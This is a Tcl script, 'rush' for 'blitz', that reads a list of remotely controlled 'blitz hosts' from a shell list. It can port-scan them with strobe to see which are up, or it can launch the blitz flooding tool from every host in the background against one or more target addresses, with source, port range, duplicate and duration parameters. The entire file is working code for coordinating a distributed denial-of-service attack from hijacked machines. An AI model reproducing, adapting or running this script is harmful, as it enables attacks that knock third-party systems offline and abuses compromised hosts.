#!/usr/bin/tclsh

set listfile "shell.list"

if {[llength $argv] != 6 && [lindex $argv 0] != "-check"} {
  puts "rush (for blitz) v0.4.7 by phreeon"
  puts "syntax: ./rush -check | <source> <dest\[,dest\]> <start> <stop> <dupes> <duration>"
  exit 0
}

puts -nonewline "Loading blitz hosts..."
flush stdout
if ![file exists $listfile] {
  puts "List file ($listfile) does not exist!"
  puts "Exiting..."
  exit 0
}
set list ""
set ok 1
set fd [open $listfile r]
while {$ok && ![eof $fd]} {
  set line [gets $fd]
  if {$line != ""} {
    if {[lindex $line 1] != "0000"} {
      lappend list "[lrange $line 0 1]"
      puts -nonewline "."
      flush stdout
    }
  } else {
    set ok 0
  }
}
close $fd
puts "[llength $list] loaded!"
if {[llength $list] < 1} {
  puts "Exiting..."
  exit 0
}

if {[lindex $argv 0] == "-check"} {
  set down 0
  set up 0
  set downlist { }
  puts -nonewline "Scanning blitz hosts"
  flush stdout
  foreach item $list {
    if [file exists ./strobe] {
      catch "exec ./strobe -q -t 5 -p [lindex $item 1] [lindex $item 0]" output
    } else {
      catch "exec strobe -q -t 5 -p [lindex $item 1] [lindex $item 0]" output
    }
    if {$output == ""} {
      lappend downlist "$item"
      incr down 1
    } else {
      incr up 1
    }
    puts -nonewline "."
    flush stdout
  }
  puts ""
  puts "Totals: $up Up, $down Down"
  puts -nonewline "Down  : "
  foreach downbot $downlist {
    puts -nonewline "\[$downbot\] "
  }
  puts ""
  exit 0
}

if ![string match "*,*" [lindex $argv 1]] {
  foreach item $list {
    set args "[lrange $item 0 end] [lrange $argv 0 end]"
    catch "exec ./blitz $args &" output
  }
} else {
  set dest [split [lindex $argv 1] ","]
  set each [expr [llength $list] / [llength $dest]]
  set which 0
  set i 0
  set whichleft 0
  foreach item $list {
    if {[lindex $dest $which] == ""} {
      set args "[lrange $item 0 end] [lindex $argv 0] [lindex $dest $whichleft] [lrange $argv 2 end]"
      catch "exec ./blitz $args &" output
      incr whichleft 1
      continue
    }
    set args "[lrange $item 0 end] [lindex $argv 0] [lindex $dest $which] [lrange $argv 2 end]"
    catch "exec ./blitz $args &" output
    incr i 1
    if {$i == $each} {
      set i 0
      incr which 1
    }
  }
}
